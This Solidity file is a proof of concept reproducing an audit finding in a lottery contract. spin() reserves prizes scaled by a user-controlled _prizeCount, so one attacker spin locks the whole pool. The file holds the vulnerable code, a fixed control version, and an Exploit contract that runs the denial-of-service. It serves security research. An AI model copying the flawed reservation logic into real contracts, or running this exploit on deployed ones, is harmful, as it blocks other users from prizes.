// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62543 (Pashov H-06):
// "Incorrect `pendingCounts` calculation".
//
// In SpinLottery, a spin distributes AT MOST ONE prize. But when a spin is
// requested, calculatePendingPrizesForRarity() reserves a `pendingCount` derived
// from the user-supplied `_prizeCount`:
//
//     pendingCount = (_prizeCount * weight) / totalRarityWeight;   // @> the bug
//
// `_prizeCount` is fully user-controlled and has NOTHING to do with the (always
// ≤1) prizes a single spin actually hands out. An attacker passes a large
// `_prizeCount` so that pendingCount == the whole available supply, reserving the
// entire pool with ONE spin (prizePools[rarity].pendingCount is inflated to
// == available). Every subsequent legitimate spin then hits
// `available - pending < pendingCounts[i]` and reverts `InsufficientPrizes`, even
// though the prizes are still physically present — a liveness DoS on all other
// users.
//
// Faithfulness notes:
//   * spin() and calculatePendingPrizesForRarity() are inlined VERBATIM from the
//     finding (only the no-op `whenNotPaused` modifier is stubbed).
//   * getAvailablePrizes() is a minimal double for the (out-of-scope) prize-pool
//     accounting: it returns a fixed N. The VRF-fulfilment path that later
//     releases pendingCount is not embedded — the harm is asserted at RESERVATION
//     time (over-reservation → InsufficientPrizes DoS), which is the finding's
//     stated core. The reservation is technically released on the attacker's own
//     VRF fulfilment, so the DoS is sustained rather than strictly permanent; the
//     accounting mismatch (reserve N for a 1-prize spin) is the measurable delta.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double used ONLY as a marker token to record harm magnitude.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract (verbatim buggy spin + calculatePendingPrizesForRarity).
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLottery {
    error InsufficientPrizes();

    struct RarityConfig {
        uint256 weight;
        bool active;
    }

    struct PrizePool {
        uint96 pendingCount;
    }

    uint8 public maxRarityId;
    uint256 public totalRarityWeight;
    mapping(uint8 => RarityConfig) public rarityConfigs;
    mapping(uint8 => PrizePool) public prizePools;

    // Per-spin working accounting (state variables, matching the verbatim usage
    // below which never declares them as memory locals).
    mapping(uint8 => uint256) public pendingCounts;
    uint256 public totalPending;

    // Minimal double for the (out-of-scope) getAvailablePrizes(): fixed supply N.
    uint256 internal availableN;

    modifier whenNotPaused() {
        _;
    }

    /// @notice Test setup: one active rarity + a fixed available prize supply N.
    function configure(uint8 _maxRarityId, uint256 _totalRarityWeight, uint256 _availableN, uint256 _weight)
        external
    {
        maxRarityId = _maxRarityId;
        totalRarityWeight = _totalRarityWeight;
        availableN = _availableN;
        rarityConfigs[1] = RarityConfig({weight: _weight, active: true});
    }

    /// @notice Minimal faithful double for the opaque prize-pool accounting.
    function getAvailablePrizes(uint8) public view returns (uint256) {
        return availableN;
    }

    /// @notice Convenience reader for the persistent reservation accumulator.
    function pendingReserved(uint8 rarity) external view returns (uint256) {
        return prizePools[rarity].pendingCount;
    }

    // ── VERBATIM from the finding ────────────────────────────────────────────
    function spin(uint256 _totalSlots, uint256 _prizeCount) external whenNotPaused returns (uint256) {
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (rarityConfigs[i].active) {
                pendingCounts[i] = calculatePendingPrizesForRarity(_prizeCount, i);
                totalPending += pendingCounts[i];
            }
        }
        if (totalPending == 0) {
            for (uint8 i = 1; i <= maxRarityId; i++) {
                if (rarityConfigs[i].active) {
                    pendingCounts[i] = 1;
                    totalPending = 1;
                    break;
                }
            }
        }
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                uint256 available = getAvailablePrizes(i);
                uint256 pending = prizePools[i].pendingCount;
                if (available - pending < pendingCounts[i]) {
                    revert InsufficientPrizes();
                }
            }
        }
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                prizePools[i].pendingCount += uint96(pendingCounts[i]);
            }
        }
    }

    function calculatePendingPrizesForRarity(uint256 _prizeCount, uint8 rarity) internal view returns (uint256) {
        if (_prizeCount == 1) {
            // For single prizes, prioritize first active rarity
            return rarity == 1 && rarityConfigs[1].active ? 1 : 0;
        }

        if (!rarityConfigs[rarity].active) return 0;

        uint256 weight = rarityConfigs[rarity].weight;
        uint256 pendingCount = (_prizeCount * weight) / totalRarityWeight; // @> user-controlled _prizeCount scales the reservation; a spin only ever distributes 1 prize

        if (_prizeCount > 1 && pendingCount == 0 && weight > 0) {
            pendingCount = 1;
        }

        return pendingCount;
    }
    // ─────────────────────────────────────────────────────────────────────────
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): calculatePendingPrizesForRarity ignores the
// user-supplied _prizeCount and reserves exactly ONE prize for the winning active
// rarity — matching the "a spin distributes at most one prize" reality.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLotteryFixed {
    error InsufficientPrizes();

    struct RarityConfig {
        uint256 weight;
        bool active;
    }

    struct PrizePool {
        uint96 pendingCount;
    }

    uint8 public maxRarityId;
    uint256 public totalRarityWeight;
    mapping(uint8 => RarityConfig) public rarityConfigs;
    mapping(uint8 => PrizePool) public prizePools;
    mapping(uint8 => uint256) public pendingCounts;
    uint256 public totalPending;
    uint256 internal availableN;

    modifier whenNotPaused() {
        _;
    }

    function configure(uint8 _maxRarityId, uint256 _totalRarityWeight, uint256 _availableN, uint256 _weight)
        external
    {
        maxRarityId = _maxRarityId;
        totalRarityWeight = _totalRarityWeight;
        availableN = _availableN;
        rarityConfigs[1] = RarityConfig({weight: _weight, active: true});
    }

    function getAvailablePrizes(uint8) public view returns (uint256) {
        return availableN;
    }

    function pendingReserved(uint8 rarity) external view returns (uint256) {
        return prizePools[rarity].pendingCount;
    }

    // Identical to the vulnerable spin(); only the reservation calculation differs.
    function spin(uint256 _totalSlots, uint256 _prizeCount) external whenNotPaused returns (uint256) {
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (rarityConfigs[i].active) {
                pendingCounts[i] = calculatePendingPrizesForRarity(_prizeCount, i);
                totalPending += pendingCounts[i];
            }
        }
        if (totalPending == 0) {
            for (uint8 i = 1; i <= maxRarityId; i++) {
                if (rarityConfigs[i].active) {
                    pendingCounts[i] = 1;
                    totalPending = 1;
                    break;
                }
            }
        }
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                uint256 available = getAvailablePrizes(i);
                uint256 pending = prizePools[i].pendingCount;
                if (available - pending < pendingCounts[i]) {
                    revert InsufficientPrizes();
                }
            }
        }
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                prizePools[i].pendingCount += uint96(pendingCounts[i]);
            }
        }
    }

    function calculatePendingPrizesForRarity(uint256, uint8 rarity) internal view returns (uint256) {
        // FIX: a single spin distributes at most one prize; reserve exactly one
        // for the winning active rarity, independent of the user-supplied count.
        return rarity == 1 && rarityConfigs[rarity].active ? 1 : 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: one attacker spin with a large _prizeCount reserves the ENTIRE
// prize supply (pendingCount inflated to == available). A legitimate victim's
// single-prize spin then reverts InsufficientPrizes though the prizes physically
// remain. The over-reservation (reserved − the 1 prize a spin can distribute) is
// recorded on a MARKER token to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // A single spin distributes at most this many prizes.
    uint256 internal constant PRIZES_PER_SPIN = 1;

    // Scenario parameters (single active rarity, weight == totalRarityWeight, so
    // pendingCount == _prizeCount; N prizes physically available).
    uint8 internal constant MAX_RARITY = 1;
    uint256 internal constant WEIGHT = 100;
    uint256 internal constant TOTAL_WEIGHT = 100;
    uint256 internal constant AVAILABLE = 3;

    // Exposed results.
    uint256 public availableN;
    uint256 public attackerReserved;
    uint256 public overReservation;
    bool public victimReverted;
    bool public victimRevertedWithInsufficientPrizes;
    uint256 public sinkMarkerBalance;
    address public vulnAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy the real vulnerable contract + the marker (marker LAST) ---
        SpinLottery lottery = new SpinLottery();               // nonce 1
        MiniToken marker = new MiniToken("Blocked Prizes", "BLOCKED-PRIZES"); // nonce 2 (LAST)

        vulnAddr = address(lottery);
        markerAddr = address(marker);

        // one active rarity; N=3 prizes physically present in the pool
        lottery.configure(MAX_RARITY, TOTAL_WEIGHT, AVAILABLE, WEIGHT);
        availableN = lottery.getAvailablePrizes(1); // 3

        // --- STEP 1: attacker over-reserves the WHOLE pool with a single spin ---
        // pendingCount = _prizeCount * weight / totalWeight = _prizeCount; pass the
        // large value AVAILABLE so pendingCount == available == 3.
        lottery.spin(10 /*_totalSlots*/, AVAILABLE /*_prizeCount*/);
        attackerReserved = lottery.pendingReserved(1); // 3 == available
        require(attackerReserved == availableN, "attacker did not reserve whole pool");

        // Bug-induced inflation: reserved (3) minus the 1 prize a spin can distribute.
        overReservation = attackerReserved - PRIZES_PER_SPIN; // 3 - 1 = 2

        // --- STEP 2: a legitimate victim spins for one prize -> InsufficientPrizes ---
        (bool ok, bytes memory ret) =
            address(lottery).call(abi.encodeWithSelector(SpinLottery.spin.selector, uint256(10), uint256(1)));
        victimReverted = !ok;

        bytes4 revertSel;
        if (ret.length >= 4) {
            assembly {
                revertSel := mload(add(ret, 0x20))
            }
        }
        victimRevertedWithInsufficientPrizes = victimReverted && revertSel == SpinLottery.InsufficientPrizes.selector;
        require(victimRevertedWithInsufficientPrizes, "victim spin should revert InsufficientPrizes");

        // --- harm: prizes physically remain but are all reserved by one spin ---
        // Record the over-reservation on the marker to the SINK.
        marker.mint(SINK, overReservation);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
